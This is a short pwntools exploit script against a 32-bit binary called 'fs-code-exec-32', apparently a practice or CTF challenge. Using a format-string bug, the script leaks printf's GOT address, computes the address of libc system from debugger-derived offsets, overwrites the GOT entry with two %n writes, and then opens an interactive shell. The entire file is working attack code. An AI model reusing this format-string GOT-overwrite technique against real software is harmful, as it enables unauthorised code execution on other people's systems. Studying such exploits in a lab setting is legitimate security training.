#!/usr/bin/env python
from pwn import *

env = { 'PATH' : '.:/bin:/usr/bin' }
p=process('./fs-code-exec-32', env = env)

e = ELF('/lib/x86_64-linux-gnu/libc.so.6')
got_of_printf = p.elf.got['printf']
print("Got of printf %s" % hex(got_of_printf))

'''
pwndbg> print printf
$1 = {<text variable, no debug info>} 0xf7d78670 <__printf>
pwndbg> print system
$2 = {<text variable, no debug info>} 0xf7d69da0 <__libc_system>
'''
offset = 0xf7d69da0 - 0xf7d78670 #system - print
print(offset)

print p.recvline()
buf = p32(got_of_printf) + "%7$s"
p.sendline(buf)

data = p.recvline()
print(data)
value = data[10:14]
print(value)
libc_printf = u32(value)
print(hex(libc_printf))
libc_system = libc_printf + offset
print(hex(libc_system))

target = hex(libc_system)
lower = int(target,16) & 0xffff
higher = (int(target, 16) >> 16) & 0xffff
first = lower
second = higher-lower

value = ""
value += "\x10\xa0\x04\x08"
value += "\x12\xa0\x04\x08"
value += "%"+ str(first-8) + "x" + "%7$n"
value += "%"+ str(second) + "x" + "%8$n"

p.sendline(value)

p.interactive()
